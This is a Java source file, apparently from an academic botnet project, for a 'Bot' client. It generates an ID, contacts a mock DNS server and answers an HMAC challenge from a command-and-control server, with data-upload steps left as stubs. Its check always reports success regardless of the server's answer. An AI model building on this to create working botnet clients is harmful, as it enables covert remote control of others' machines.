package cs.sii.bot.passive;

import java.lang.reflect.Type;
import java.util.ArrayList;
import java.util.List;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;


import cs.sii.bot.active.CryptoAuth;
import cs.sii.config.bot.Engine;
import cs.sii.connection.AsyncRequest;
import cs.sii.connection.NetworkService;
import cs.sii.model.Conversions;
import cs.sii.model.Pairs;
import javassist.bytecode.ByteArray;
import javassist.compiler.SymbolTable;

@Service
public class Bot {

@Autowired
private Engine engineBot;
	
@Autowired
private NetworkService networkService;

@Autowired
private AsyncRequest request;

@Autowired
private CryptoAuth auth;
	
public Bot(){}


public void initializeBot(){
	
if(!engineBot.isCommandandconquerStatus()){
	
	//metter controllo ID se ==NULL genera altrimenti riusa
	//TODO salvare ID su properties
	networkService.generateID();
	//inserire id univoco nella richiesta
	networkService.firstConnectToMockServerDns();
	//reinserire id univoco nella richiesta
	if(challengeToCommandConquer()){
		//push info online os
		System.out.println("Bot is Ready");}
	else
		System.out.println("Bot not Ready, authentication failed");
}
}



public void getInfo(){
	
	//prendi info sistema 
	
	//pusha online info
	
}

private boolean challengeToCommandConquer(){
	//
	System.out.println(networkService.getCommandConquerIps().getIPList().get(0));
		
	Pairs<Long,Integer> challenge=request.getChallengeFromCommandAndConquer(networkService.getCommandConquerIps().getIPList().get(0));
	
	
	if(challenge!=null){
		
		String key=auth.generateStringKey(challenge.getValue2());
		String hashMac=auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
		System.out.println(hashMac);
		String response=request.getResponseFromCommandAndConquer(networkService.getCommandConquerIps().getIPList().get(0),challenge.getValue1(), challenge.getValue2(), hashMac);
		System.out.println("La risposta del CeC: "+response);
		
	}
	
	
	return true;
}



}
